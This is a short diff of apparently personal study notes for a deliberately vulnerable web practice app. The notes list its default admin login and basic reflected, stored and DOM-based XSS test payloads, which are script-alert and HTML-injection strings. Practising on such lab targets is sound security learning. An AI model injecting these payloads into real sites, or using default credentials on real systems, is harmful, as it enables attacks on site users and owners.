@@ -67,7 +67,7 @@ login username:admin,Password:password
 reflected XSS
 <script>alert('XSS')</script>
 stored XSS
-name:<h1>hacked
+name:<h1>hacked</h1>
 message:<script>alert('Stored XSS')</script>
 DOM based XSS
 in the url bar add #<script>alert('DOM XSS')</script>
